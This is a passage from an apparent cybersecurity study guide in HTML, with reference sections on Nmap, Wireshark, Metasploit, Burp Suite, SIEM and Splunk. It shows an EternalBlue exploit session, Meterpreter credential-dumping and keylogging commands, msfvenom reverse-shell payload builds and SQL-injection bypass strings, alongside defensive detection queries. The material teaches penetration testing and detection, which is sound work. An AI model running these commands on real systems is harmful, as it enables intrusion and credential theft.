+      <div class="tbody"><pre><span class="cm">━━━ SCAN TYPES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="ip">192.168.1.1</span></span>                               <span class="cm"># Basic scan (top 1000 ports)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-sS</span> <span class="ip">192.168.1.1</span></span>                          <span class="cm"># SYN scan (stealth, default)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-sT</span> <span class="ip">192.168.1.1</span></span>                          <span class="cm"># TCP connect (full handshake, louder)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-sU</span> <span class="fl">--top-ports 100</span> <span class="ip">192.168.1.1</span></span>          <span class="cm"># UDP top 100 ports</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-sV</span> <span class="ip">192.168.1.1</span></span>                          <span class="cm"># Version detection</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-sC</span> <span class="ip">192.168.1.1</span></span>                          <span class="cm"># Default scripts</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-O</span> <span class="ip">192.168.1.1</span></span>                           <span class="cm"># OS detection</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-A</span> <span class="ip">192.168.1.1</span></span>                           <span class="cm"># Aggressive: -sV -sC -O -traceroute</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-p-</span> <span class="ip">192.168.1.1</span></span>                          <span class="cm"># All 65535 ports</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-p 22,80,443,3306</span> <span class="ip">192.168.1.1</span></span>           <span class="cm"># Specific ports</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-sn</span> <span class="ip">192.168.1.0/24</span></span>                      <span class="cm"># Ping sweep (host discovery)</span>
+
+<span class="cm">━━━ SPEED &amp; TIMING ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="fl">-T0</span>  Paranoid  (slowest, IDS evasion)
+<span class="fl">-T1</span>  Sneaky
+<span class="fl">-T2</span>  Polite
+<span class="fl">-T3</span>  Normal    (default)
+<span class="fl">-T4</span>  Aggressive (faster, recommended for labs)
+<span class="fl">-T5</span>  Insane    (fastest, may miss results)
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-p- --min-rate 5000 -T4</span> <span class="ip">10.10.10.5</span></span>      <span class="cm"># Fast full scan</span>
+
+<span class="cm">━━━ NSE SCRIPTS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">--script vuln</span> <span class="ip">192.168.1.1</span></span>               <span class="cm"># Check known CVEs</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">--script</span> smb-vuln-ms17-010 <span class="ip">192.168.1.1</span></span>  <span class="cm"># EternalBlue check</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">--script</span> http-title,http-headers <span class="ip">192.168.1.1</span></span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">--script</span> ftp-anon <span class="fl">-p 21</span> <span class="ip">192.168.1.1</span></span>     <span class="cm"># Anonymous FTP?</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ls /usr/share/nmap/scripts/ | grep smb</span>         <span class="cm"># List SMB scripts</span>
+
+<span class="cm">━━━ OUTPUT FORMATS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-oN scan.txt</span> <span class="ip">192.168.1.1</span></span>               <span class="cm"># Normal output</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-oX scan.xml</span> <span class="ip">192.168.1.1</span></span>               <span class="cm"># XML output (for tools)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-oG scan.gnmap</span> <span class="ip">192.168.1.1</span></span>             <span class="cm"># Grepable output</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap <span class="fl">-oA results</span> <span class="ip">192.168.1.1</span></span>               <span class="cm"># All formats simultaneously</span>
+
+<span class="cm">━━━ REAL OUTPUT EXAMPLE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">nmap -sV -sC -A -p- 10.10.10.5</span>
+<span class="out">PORT     STATE SERVICE   VERSION
+22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu
+80/tcp   open  http      Apache httpd 2.4.29
+| http-title: CompanyApp v2.1.3
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+443/tcp  open  ssl/https Apache httpd 2.4.29
+3306/tcp open  mysql     MySQL 5.7.34
+| mysql-info: Protocol: 10
+|_ Server Version: 5.7.34-0ubuntu0.18.04.1
+8080/tcp open  http-proxy Squid 4.1
+OS: Linux 4.15
+Network Distance: 2 hops
+TRACEROUTE (using port 22/tcp)
+1   1.2 ms 10.10.14.1
+2   2.8 ms 10.10.10.5</span></pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Nmap is the first tool run in every penetration test and network audit. Mastering its scan types, timing options, and NSE scripts turns port scanning into comprehensive network intelligence gathering. The output directly informs which tools and exploits to use next.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T152 ===== -->
+<div class="sec" id="t152">
+  <div class="sh"><span class="sn">Topic 152</span><h2>Wireshark</h2><span class="se">🦈</span></div>
+  <div class="sb">
+    <div class="tool-hero">
+      <div class="tool-icon">🦈</div>
+      <div class="tool-info">
+        <div class="tool-name">Wireshark</div>
+        <div class="tool-cat">PACKET ANALYSER · NETWORK FORENSICS · PROTOCOL DECODE</div>
+        <div class="tool-desc">The world's most popular network protocol analyser. Captures live network traffic or reads .pcap files. Decodes 2,000+ protocols. Essential for troubleshooting, security analysis, and learning how protocols work.</div>
+      </div>
+      <div class="tool-stats">
+        <span class="stat-pill sp-free">✓ FREE / OPEN SOURCE</span>
+        <span class="stat-pill sp-os">wireshark.org</span>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">WIRESHARK + TSHARK REFERENCE</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ LAUNCH &amp; CAPTURE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo wireshark &amp;</span>                                <span class="cm"># GUI (select interface)</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tshark <span class="fl">-i eth0</span></span>                            <span class="cm"># CLI capture on eth0</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo tshark <span class="fl">-i eth0 -w capture.pcap</span></span>           <span class="cm"># Save to file</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">tshark <span class="fl">-r capture.pcap</span></span>                         <span class="cm"># Read pcap file</span>
+
+<span class="cm">━━━ DISPLAY FILTERS (most important feature) ━━━━━━━━━━━━━━━━━</span>
+<span class="fl">ip.addr == 192.168.1.100</span>              <span class="cm"># Traffic to/from specific IP</span>
+<span class="fl">ip.src == 192.168.1.50</span>                <span class="cm"># Source IP only</span>
+<span class="fl">tcp.port == 80</span>                        <span class="cm"># HTTP traffic</span>
+<span class="fl">http</span>                                  <span class="cm"># All HTTP packets</span>
+<span class="fl">http.request.method == "POST"</span>         <span class="cm"># POST requests only</span>
+<span class="fl">http contains "password"</span>              <span class="cm"># HTTP with "password" in body</span>
+<span class="fl">dns.qry.name contains "evil"</span>          <span class="cm"># Suspicious DNS queries</span>
+<span class="fl">tcp.flags.syn == 1 && tcp.flags.ack == 0</span>  <span class="cm"># SYN packets (port scans)</span>
+<span class="fl">!(arp || dns || icmp)</span>                 <span class="cm"># Exclude noise protocols</span>
+<span class="fl">frame.len > 1000</span>                      <span class="cm"># Large packets only</span>
+<span class="fl">tls</span>                                  <span class="cm"># All TLS/SSL traffic</span>
+<span class="fl">ssl.record.content_type == 23</span>         <span class="cm"># TLS application data</span>
+<span class="fl">tcp.stream eq 5</span>                      <span class="cm"># Follow specific TCP stream</span>
+<span class="fl">icmp.type == 8</span>                        <span class="cm"># ICMP echo requests (ping)</span>
+<span class="fl">smb || smb2</span>                          <span class="cm"># SMB protocol</span>
+
+<span class="cm">━━━ CAPTURE FILTERS (BPF syntax, set before capturing) ━━━━━━━</span>
+<span class="fl">host 192.168.1.100</span>                    <span class="cm"># Only this host</span>
+<span class="fl">port 80</span>                               <span class="cm"># Only port 80</span>
+<span class="fl">tcp and port 443</span>                      <span class="cm"># HTTPS only</span>
+<span class="fl">not port 53</span>                          <span class="cm"># Exclude DNS</span>
+
+<span class="cm">━━━ TSHARK USEFUL EXTRACTIONS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">tshark <span class="fl">-r cap.pcap -Y "http.request.method==POST" -T fields -e http.file_data</span></span>
+<span class="out">username=admin&password=P@ssword123  ← Plaintext credentials!</span>
+
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">tshark <span class="fl">-r cap.pcap -Y dns -T fields -e dns.qry.name</span> | sort | uniq -c | sort -rn | head</span>
+<span class="out">   342 api.google.com
+    89 analytics.company.com
+    17 evil-c2-server.xyz   ← Suspicious!</span>
+
+<span class="cm">━━━ FORENSIC ANALYSIS WORKFLOW ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Statistics → Conversations (who talked to whom, how much data)</span>
+<span class="cm"># Statistics → Protocol Hierarchy (what protocols used)</span>
+<span class="cm"># Right-click packet → Follow → TCP Stream (see full conversation)</span>
+<span class="cm"># File → Export Objects → HTTP (extract downloaded files)</span>
+<span class="cm"># Analyze → Expert Information (Wireshark flags anomalies)</span></pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Wireshark is the microscope of network security. Every protocol, every credential, every piece of data moving unencrypted across a network is visible. For defenders: essential for incident response and protocol analysis. For attackers: demonstrates why HTTPS is mandatory for everything.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T153 ===== -->
+<div class="sec" id="t153">
+  <div class="sh"><span class="sn">Topic 153</span><h2>Metasploit Framework</h2><span class="se">💀</span></div>
+  <div class="sb">
+    <div class="tool-hero">
+      <div class="tool-icon">💀</div>
+      <div class="tool-info">
+        <div class="tool-name">Metasploit</div>
+        <div class="tool-cat">EXPLOITATION FRAMEWORK · POST-EXPLOITATION · PAYLOAD GENERATION</div>
+        <div class="tool-desc">The world's most widely used penetration testing framework. Contains 2,000+ exploits, 500+ auxiliary modules, hundreds of payloads. Community edition is free; Pro adds automation and reporting. Owned by Rapid7.</div>
+      </div>
+      <div class="tool-stats">
+        <span class="stat-pill sp-free">Community: FREE</span>
+        <span class="stat-pill sp-paid">Pro: $15K+/yr</span>
+        <span class="stat-pill sp-os">metasploit.com</span>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">METASPLOIT — COMPLETE REFERENCE</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ STARTUP &amp; BASICS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo msfdb init && msfconsole</span>             <span class="cm"># Init DB + start</span>
+<span class="out">msf6 &gt;</span> <span class="cmd">help</span>                                   <span class="cm"># Show all commands</span>
+<span class="out">msf6 &gt;</span> <span class="cmd">search eternalblue</span>                   <span class="cm"># Search exploits</span>
+<span class="out">msf6 &gt;</span> <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="out">msf6 exploit(ms17_010) &gt;</span> <span class="cmd">info</span>              <span class="cm"># Module details</span>
+<span class="out">msf6 exploit(ms17_010) &gt;</span> <span class="cmd">show options</span>      <span class="cm"># Required options</span>
+<span class="out">msf6 exploit(ms17_010) &gt;</span> <span class="cmd">set RHOSTS <span class="ip">10.10.10.5</span></span>
+<span class="out">msf6 exploit(ms17_010) &gt;</span> <span class="cmd">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span class="out">msf6 exploit(ms17_010) &gt;</span> <span class="cmd">set LHOST <span class="ip">10.10.14.3</span></span>
+<span class="out">msf6 exploit(ms17_010) &gt;</span> <span class="cmd">check</span>             <span class="cm"># Check if target vulnerable</span>
+<span class="out">msf6 exploit(ms17_010) &gt;</span> <span class="cmd">run</span>               <span class="cm"># Launch exploit</span>
+
+<span class="cm">━━━ MODULE TYPES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="fl">exploit/</span>    <span class="cm"># Exploits specific vulnerabilities</span>
+<span class="fl">auxiliary/</span>  <span class="cm"># Scanners, fuzzers, DoS, brute force (no payload)</span>
+<span class="fl">post/</span>       <span class="cm"># Post-exploitation: dump creds, persistence, pivot</span>
+<span class="fl">payload/</span>    <span class="cm"># Shellcode that executes on target</span>
+<span class="fl">encoder/</span>    <span class="cm"># Encode payload to evade AV</span>
+<span class="fl">nop/</span>        <span class="cm"># NOP sleds for buffer overflows</span>
+
+<span class="cm">━━━ METERPRETER COMMANDS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">sysinfo</span>                       <span class="cm"># OS, hostname, arch</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">getuid</span>                        <span class="cm"># Current user</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">getpid</span>                        <span class="cm"># Current process ID</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">getsystem</span>                     <span class="cm"># Attempt privilege escalation</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">hashdump</span>                      <span class="cm"># Dump Windows SAM hashes</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">load kiwi</span>                     <span class="cm"># Load Mimikatz</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">creds_all</span>                     <span class="cm"># All credentials!</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">screenshot</span>                    <span class="cm"># Desktop screenshot</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">keyscan_start</span>                 <span class="cm"># Start keylogger</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">keyscan_dump</span>                  <span class="cm"># Dump keystrokes</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">shell</span>                         <span class="cm"># Drop to system shell</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">background</span>                    <span class="cm"># Background this session</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">sessions -l</span>                   <span class="cm"># List all sessions</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">run post/multi/recon/local_exploit_suggester</span>  <span class="cm"># PrivEsc ideas</span>
+<span class="out">meterpreter &gt;</span> <span class="cmd">run post/windows/gather/smart_hashdump</span>
+
+<span class="cm">━━━ MSFVENOM — PAYLOAD GENERATION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="ip">10.10.14.3</span> LPORT=4444 -f exe -o shell.exe</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="ip">10.10.14.3</span> LPORT=4444 -f elf -o shell.elf</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="ip">10.10.14.3</span> LPORT=4444 -f raw -o shell.php</span>
+<span class="p">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">msfvenom -l payloads | grep windows</span>             <span class="cm"># List all Windows payloads</span></pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Metasploit is the Swiss Army knife of exploitation. Its value is not just in running exploits but in providing a structured framework for penetration testing — managing sessions, post-exploitation, and reporting. Master the auxiliary modules (for scanning) before the exploit modules (for gaining access).</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T154 ===== -->
+<div class="sec" id="t154">
+  <div class="sh"><span class="sn">Topic 154</span><h2>Burp Suite</h2><span class="se">🔬</span></div>
+  <div class="sb">
+    <div class="tool-hero">
+      <div class="tool-icon">🔬</div>
+      <div class="tool-info">
+        <div class="tool-name">Burp Suite</div>
+        <div class="tool-cat">WEB APPLICATION SECURITY TESTING · HTTP PROXY · VULNERABILITY SCANNER</div>
+        <div class="tool-desc">The industry-standard web application security testing platform by PortSwigger. Intercepts, modifies, and replays HTTP/HTTPS requests. Community edition is free; Professional adds active scanner, Collaborator, and advanced fuzzing.</div>
+      </div>
+      <div class="tool-stats">
+        <span class="stat-pill sp-free">Community: FREE</span>
+        <span class="stat-pill sp-paid">Pro: $449/yr</span>
+        <span class="stat-pill sp-os">portswigger.net</span>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">BURP SUITE — MODULES &amp; WORKFLOWS</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ SETUP ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># 1. Launch Burp Suite → Proxy → Options → 127.0.0.1:8080</span>
+<span class="cm"># 2. Browser → Proxy settings → 127.0.0.1:8080</span>
+<span class="cm"># 3. Visit http://burpsuite → Download CA cert → Import to browser</span>
+<span class="cm"># Now Burp intercepts ALL HTTPS traffic!</span>
+
+<span class="cm">━━━ PROXY MODULE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Intercept a login request:</span>
+<span class="fl">POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=password123</span>
+<span class="cm"># Modify password field → Forward → test SQLi, auth bypass</span>
+
+<span class="cm">━━━ REPEATER MODULE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Ctrl+R to send to Repeater</span>
+<span class="cm"># Testing SQLi manually:</span>
+<span class="err">username=admin'--&password=anything</span>    <span class="cm"># Auth bypass attempt</span>
+<span class="err">username=admin' OR '1'='1'--&password=x</span>  <span class="cm"># Always-true bypass</span>
+<span class="cm"># Modify → Send → Analyse response differences</span>
+
+<span class="cm">━━━ INTRUDER MODULE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Mark attack positions: username=§FUZZ§&password=admin</span>
+<span class="cm"># Attack types:</span>
+<span class="cg">Sniper</span>       → 1 payload list, 1 position
+<span class="cg">Battering Ram</span> → Same payload all positions
+<span class="cg">Pitchfork</span>   → Multiple lists, parallel (user:pass stuffing)
+<span class="cg">Cluster Bomb</span> → All combinations (true brute force)
+
+<span class="cm"># Payload lists:</span>
+<span class="cm"># /usr/share/wordlists/rockyou.txt → passwords</span>
+<span class="cm"># /usr/share/seclists/Usernames/top-usernames-shortlist.txt → usernames</span>
+<span class="cm"># After attack: Sort by Status Code or Response Length → find anomalies</span>
+
+<span class="cm">━━━ DECODER MODULE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Decode Base64 cookie: aWQ9MTAwMQ== → id=1001 → change → re-encode → IDOR!</span>
+<span class="cm"># URL decode: %27+OR+%271%27%3D%271 → ' OR '1'='1 (SQLi)</span>
+<span class="cm"># Ctrl+Shift+B → instant decode selected text</span>
+
+<span class="cm">━━━ USEFUL EXTENSIONS (BApp Store) ━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="hl">Autorize</span>     → Test IDOR: replay requests as lower-privilege user
+<span class="hl">JWT Editor</span>   → Modify JWT tokens, test alg:none, crack weak secrets
+<span class="hl">Param Miner</span>  → Discover hidden/undocumented parameters
+<span class="hl">Turbo Intruder</span> → Python-scriptable high-speed fuzzer
+<span class="hl">Logger++</span>     → Advanced request logging + filtering
+<span class="hl">Retire.js</span>    → Detect vulnerable JavaScript libraries on pages</pre></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Burp Suite is mandatory for any web security work. The combination of Proxy (visibility), Repeater (precision), Intruder (automation), and Decoder (manipulation) covers every web vulnerability testing workflow. Practice on PortSwigger Web Security Academy — free labs covering every OWASP Top 10 category.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T155 ===== -->
+<div class="sgt">🔥 Detection &amp; Analysis — SIEM</div>
+<div class="sec" id="t155">
+  <div class="sh"><span class="sn">Topic 155 🔥</span><h2>SIEM Basics</h2><span class="se">📊</span></div>
+  <div class="sb">
+    <div class="oneliner"><div class="ol-lbl">⚡ Summary</div>SIEM (Security Information and Event Management) collects and correlates logs from all security tools into one platform — turning millions of individual log lines into actionable security alerts by detecting attack patterns across the full kill chain.</div>
+    <div class="def"><div class="dl">Definition</div>
+      <strong>SIEM</strong> combines <strong>Security Information Management (SIM)</strong> (long-term log storage and compliance) with <strong>Security Event Management (SEM)</strong> (real-time threat detection and alerting). The result is a centralised platform that ingests logs from every source, correlates them against detection rules, and creates alerts for the SOC team.
+    </div>
+    <div class="sub"><h3>How SIEM Works</h3>
+      <div class="cb"><div class="clbl">SIEM DATA FLOW</div><pre><span class="cy">Data Sources → Collection → Normalisation → Correlation → Alerting → Response</span>
+     │                                                              │
+<span class="fl">Firewalls</span>      Log forwarder    Parse to          Rule engine    SOC analyst
+<span class="fl">Servers</span>        (syslog, agent)  common schema     matches         investigates
+<span class="fl">Endpoints</span>      (Beats, Fluentd) JSON/CEF/LEEF     patterns        and responds
+<span class="fl">Network</span>
+<span class="fl">Cloud APIs</span>
+
+<span class="cy">Example correlation rule (detect brute force):</span>
+<span class="cg">IF</span> event_type = "authentication_failure"
+<span class="cg">AND</span> count(event) > 5
+<span class="cg">WITHIN</span> 60 seconds
+<span class="cg">FROM</span> same source_ip
+<span class="cg">THEN</span> create alert: "BRUTE FORCE DETECTED" severity=HIGH
+
+<span class="cy">Multi-event correlation (detect lateral movement):</span>
+<span class="cg">IF</span> workstation_A fails SSH to workstation_B (auth failure)
+<span class="cg">AND</span> workstation_A connects to workstation_C (SMB success)
+<span class="cg">AND</span> workstation_A connects to DC via RPC
+<span class="cg">WITHIN</span> 30 minutes
+<span class="cg">THEN</span> alert: "LATERAL MOVEMENT DETECTED"</pre></div>
+    </div>
+    <div class="sub"><h3>Key SIEM Use Cases</h3>
+      <div class="cg2">
+        <div class="card"><div class="ci2">🔍</div><div class="ct">Threat Detection</div><div class="cd2">Correlate events to detect attacks in progress — brute force, lateral movement, exfiltration.</div></div>
+        <div class="card"><div class="ci2">📋</div><div class="ct">Compliance</div><div class="cd2">PCI-DSS, HIPAA, ISO 27001, GDPR all require centralised log management and audit trails.</div></div>
+        <div class="card"><div class="ci2">🔬</div><div class="ct">Incident Investigation</div><div class="cd2">Timeline reconstruction of an attack using historical logs. Answer: what happened, when, how?</div></div>
+        <div class="card"><div class="ci2">🎯</div><div class="ct">Threat Hunting</div><div class="cd2">Proactively search logs for hidden threats using MITRE ATT&CK technique queries.</div></div>
+        <div class="card"><div class="ci2">📊</div><div class="ct">Dashboards</div><div class="cd2">Real-time visibility: top talkers, failed logins, patch status, geographic anomalies.</div></div>
+        <div class="card"><div class="ci2">⚡</div><div class="ct">SOAR Integration</div><div class="cd2">SIEM + SOAR = automated response: block IP, quarantine host, create ticket, notify team.</div></div>
+      </div>
+    </div>
+    <div class="sub"><h3>SIEM Products Comparison</h3>
+      <div class="tw"><table>
+        <thead><tr><th>SIEM</th><th>Type</th><th>Strength</th><th>Used By</th><th>Cost</th></tr></thead>
+        <tbody>
+          <tr><td>Splunk Enterprise</td><td>Commercial</td><td>Search speed, ecosystem, SPL query power</td><td>Fortune 500, large enterprises</td><td>High ($$$)</td></tr>
+          <tr><td>Microsoft Sentinel</td><td>Cloud (Azure)</td><td>Microsoft 365 integration, AI/ML analytics</td><td>Microsoft shops, cloud-first</td><td>Pay per GB</td></tr>
+          <tr><td>IBM QRadar</td><td>Commercial</td><td>Advanced analytics, network flow (QFlow)</td><td>Banks, government</td><td>High ($$$)</td></tr>
+          <tr><td>ELK Stack</td><td>Open Source</td><td>Free, flexible, customisable</td><td>SMEs, DevOps, security-aware</td><td>Free (infra cost)</td></tr>
+          <tr><td>Graylog</td><td>Open Source</td><td>Simple, fast search, easy setup</td><td>SMEs, open source users</td><td>Free / £/$</td></tr>
+          <tr><td>Wazuh</td><td>Open Source</td><td>Host-based IDS + SIEM, HIPAA/PCI compliant</td><td>Compliance-focused SMEs</td><td>Free</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>SIEM is the command centre of the SOC. Without it, security teams are blind — they have thousands of logs across hundreds of systems with no way to correlate them. The effectiveness of a SIEM is directly proportional to the quality of its detection rules (use-cases) and the skill of the analysts interpreting alerts.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T156 ===== -->
+<div class="sec" id="t156">
+  <div class="sh"><span class="sn">Topic 156 🔥</span><h2>Splunk</h2><span class="se">🟢</span></div>
+  <div class="sb">
+    <div class="tool-hero">
+      <div class="tool-icon">🟢</div>
+      <div class="tool-info">
+        <div class="tool-name">Splunk</div>
+        <div class="tool-cat">ENTERPRISE SIEM · LOG ANALYTICS · SPL SEARCH LANGUAGE</div>
+        <div class="tool-desc">The leading commercial SIEM platform. Ingests machine data from any source. Uses its proprietary Search Processing Language (SPL) for powerful analytics. 90-day free trial; free tier handles 500MB/day. Industry standard for enterprise SOCs.</div>
+      </div>
+      <div class="tool-stats">
+        <span class="stat-pill sp-free">Free: 500MB/day</span>
+        <span class="stat-pill sp-paid">Enterprise: $$$</span>
+        <span class="stat-pill sp-os">splunk.com</span>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="thd"><div class="tdots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="ttl">SPLUNK SPL — SEARCH PROCESSING LANGUAGE</div></div>
+      <div class="tbody"><pre><span class="cm">━━━ BASIC SEARCH SYNTAX ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Search all events:</span>
+<span class="fl">index=*</span>
+
+<span class="cm"># Search specific index, time range:</span>
+<span class="fl">index=windows_logs earliest=-24h latest=now</span>
+
+<span class="cm"># Search for specific terms:</span>
+<span class="fl">index=auth_logs "Failed password" src_ip=192.168.1.*</span>
+
+<span class="cm"># Field-value searches:</span>
+<span class="fl">index=firewall action=blocked dest_port=22</span>
+
+<span class="cm">━━━ SPL COMMANDS (PIPE-BASED LIKE UNIX) ━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cm"># Count events by source IP (find top talkers):</span>
+<span class="cg">index=firewall action=blocked
+| stats count by src_ip
+| sort -count
+| head 10</span>
+
+<span class="cm"># Detect brute force (5+ failed logins from same IP in 5 minutes):</span>
+<span class="cg">index=auth_logs "authentication failure"
+| bin _time span=5m
+| stats count by _time, src_ip
+| where count > 5
+| sort -count</span>
+
+<span class="cm"># Detect after-hours logins (outside 8am-6pm):</span>
+<span class="cg">index=auth_logs action=success
+| eval hour=strftime(_time, "%H")
+| where hour < 8 OR hour > 18
+| table _time, user, src_ip, host</span>
+
+<span class="cm"># Find PowerShell execution (fileless malware indicator):</span>
+<span class="cg">index=windows_sysmon EventCode=1
+| where match(CommandLine, "(?i)(powershell|pwsh)")
+| where match(CommandLine, "(?i)(-enc|-encoded|-w hidden|-nop)")
+| table _time, Computer, User, CommandLine</span>
+
+<span class="cm"># Track data exfiltration (large outbound transfers):</span>
+<span class="cg">index=network bytes_out > 100000000
+| stats sum(bytes_out) as total_bytes by src_ip, dest_ip
+| where total_bytes > 1000000000
+| sort -total_bytes</span>
+
+<span class="cm"># Correlate firewall blocks with internal scanner (lateral movement):</span>
+<span class="cg">index=firewall action=blocked dest_port=445
+| stats count by src_ip
+| where count > 50
+| rename src_ip as lateral_movement_source</span>
+
+<span class="cm">━━━ USEFUL SPL COMMANDS REFERENCE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="hl">stats</span>    → Aggregate: count, sum, avg, min, max, dc (distinct count)
